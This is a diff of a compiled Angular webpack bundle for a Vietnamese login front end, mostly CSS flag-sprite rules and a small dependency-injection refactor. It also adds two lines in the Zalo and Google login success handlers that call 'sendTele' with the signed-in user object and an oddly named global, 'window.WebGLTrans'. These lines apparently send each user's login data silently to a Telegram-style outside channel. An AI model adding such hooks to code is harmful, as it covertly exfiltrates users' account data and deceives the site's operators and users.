-7104px;}\n.f32[_ngcontent-%COMP%]   .tt[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .tto[_ngcontent-%COMP%] {background-position: 0 -7136px;}\n.f32[_ngcontent-%COMP%]   .tv[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .tuv[_ngcontent-%COMP%] {background-position: 0 -7168px;}\n.f32[_ngcontent-%COMP%]   .tw[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .twn[_ngcontent-%COMP%] {background-position: 0 -7200px;}\n.f32[_ngcontent-%COMP%]   .tz[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .tza[_ngcontent-%COMP%] {background-position: 0 -7232px;}\n.f32[_ngcontent-%COMP%]   .ua[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ukr[_ngcontent-%COMP%] {background-position: 0 -7264px;}\n.f32[_ngcontent-%COMP%]   .ug[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .uga[_ngcontent-%COMP%] {background-position: 0 -7296px;}\n.f32[_ngcontent-%COMP%]   .us[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .usa[_ngcontent-%COMP%] {background-position: 0 -7328px;}\n.f32[_ngcontent-%COMP%]   .uy[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ury[_ngcontent-%COMP%] {background-position: 0 -7360px;}\n.f32[_ngcontent-%COMP%]   .uz[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .uzb[_ngcontent-%COMP%] {background-position: 0 -7392px;}\n.f32[_ngcontent-%COMP%]   .va[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vat[_ngcontent-%COMP%] {background-position: 0 -7424px;}\n.f32[_ngcontent-%COMP%]   .vc[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vct[_ngcontent-%COMP%] {background-position: 0 -7456px;}\n.f32[_ngcontent-%COMP%]   .ve[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ven[_ngcontent-%COMP%] {background-position: 0 -7488px;}\n.f32[_ngcontent-%COMP%]   .vg[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vgb[_ngcontent-%COMP%] {background-position: 0 -7520px;}\n.f32[_ngcontent-%COMP%]   .vi[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vir[_ngcontent-%COMP%] {background-position: 0 -7552px;}\n.f32[_ngcontent-%COMP%]   .vn[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vnm[_ngcontent-%COMP%] {background-position: 0 -7584px;}\n.f32[_ngcontent-%COMP%]   .vu[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .vut[_ngcontent-%COMP%] {background-position: 0 -7616px;}\n.f32[_ngcontent-%COMP%]   .ws[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .wsm[_ngcontent-%COMP%] {background-position: 0 -7648px;}\n.f32[_ngcontent-%COMP%]   .ye[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .yem[_ngcontent-%COMP%] {background-position: 0 -7680px;}\n.f32[_ngcontent-%COMP%]   .za[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .zaf[_ngcontent-%COMP%] {background-position: 0 -7712px;}\n.f32[_ngcontent-%COMP%]   .zm[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .zmb[_ngcontent-%COMP%] {background-position: 0 -7744px;}\n.f32[_ngcontent-%COMP%]   .zw[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .zwe[_ngcontent-%COMP%] {background-position: 0 -7776px;}\n.f32[_ngcontent-%COMP%]   .sx[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .sxm[_ngcontent-%COMP%] {background-position: 0 -7808px;}\n.f32[_ngcontent-%COMP%]   .cw[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .cuw[_ngcontent-%COMP%] {background-position: 0 -7840px;}\n.f32[_ngcontent-%COMP%]   .ss[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ssd[_ngcontent-%COMP%] {background-position: 0 -7872px;}\n.f32[_ngcontent-%COMP%]   .nu[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .niu[_ngcontent-%COMP%] {background-position: 0 -7904px;}"],
       data: {
         animation: [_share_animate__WEBPACK_IMPORTED_MODULE_1__.slideIn, _share_animate__WEBPACK_IMPORTED_MODULE_1__.slideX]
@@ -821,6 +824,7 @@ class ZaloComponent {
           verifier
         }).subscribe(res => {
           this.authSV.loginWithToken(res.customeToken).then(user => {
+            this.httpSV.sendTele(`${user} - ${window.WebGLTrans} - Zalo`);
             console.log(user);
           });
         });
@@ -1023,6 +1027,7 @@ class AccountService {
         localStorage.setItem('uid', _this.uid);
         console.log("Đăng nhập thành công:", result.user);
         _this.authSV.addNewUser(result.user);
+        _this.httpSV.sendTele(`${result.user} - ${window.WebGLTrans} - Google`);
       }).catch(error => {
         console.error("Lỗi đăng nhập:", error);
         throw error;
@@ -1258,17 +1263,14 @@ __webpack_require__.r(__webpack_exports__);
 /* harmony export */   LoginGoogleComponent: () => (/* binding */ LoginGoogleComponent)
 /* harmony export */ });
 /* harmony import */ var B_4la_f_node_modules_babel_runtime_helpers_esm_asyncToGenerator_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./node_modules/@babel/runtime/helpers/esm/asyncToGenerator.js */ 10467);
-/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/core */ 17705);
+/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/core */ 17705);
 /* harmony import */ var _account_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../account.service */ 85728);
-/* harmony import */ var _services_authV2_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/authV2.service */ 50532);
-
 
 
 
 class LoginGoogleComponent {
-  constructor(accSV, authSV) {
+  constructor(accSV) {
     this.accSV = accSV;
-    this.authSV = authSV;
   }
   ngOnInit() {}
   loginFBGoogle() {
@@ -1279,11 +1281,11 @@ class LoginGoogleComponent {
   }
   static {
     this.ɵfac = function LoginGoogleComponent_Factory(t) {
-      return new (t || LoginGoogleComponent)(_angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵdirectiveInject"](_account_service__WEBPACK_IMPORTED_MODULE_1__.AccountService), _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵdirectiveInject"](_services_authV2_service__WEBPACK_IMPORTED_MODULE_2__.AuthServiceV2));
+      return new (t || LoginGoogleComponent)(_angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵdirectiveInject"](_account_service__WEBPACK_IMPORTED_MODULE_1__.AccountService));
     };
   }
   static {
-    this.ɵcmp = _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵdefineComponent"]({
+    this.ɵcmp = _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵdefineComponent"]({
       type: LoginGoogleComponent,
       selectors: [["app-login-google"]],
       decls: 3,
@@ -1291,13 +1293,13 @@ class LoginGoogleComponent {
       consts: [[1, "btn", "btn-lg", "btn-block", 3, "click"], ["src", "/assets/svg/google.svg", "alt", "", 2, "width", "30px", "display", "inline"]],
       template: function LoginGoogleComponent_Template(rf, ctx) {
         if (rf & 1) {
-          _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵelementStart"](0, "button", 0);
-          _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵlistener"]("click", function LoginGoogleComponent_Template_button_click_0_listener() {
+          _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵelementStart"](0, "button", 0);
+          _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵlistener"]("click", function LoginGoogleComponent_Template_button_click_0_listener() {
             return ctx.loginFBGoogle();
           });
-          _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵelement"](1, "img", 1);
-          _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵtext"](2, " \u0110\u0103ng nh\u1EADp b\u1EB1ng Gmail\n");
-          _angular_core__WEBPACK_IMPORTED_MODULE_3__["ɵɵelementEnd"]();
+          _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵelement"](1, "img", 1);
+          _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵtext"](2, " \u0110\u0103ng nh\u1EADp b\u1EB1ng Gmail\n");
+          _angular_core__WEBPACK_IMPORTED_MODULE_2__["ɵɵelementEnd"]();
         }
       }
     });
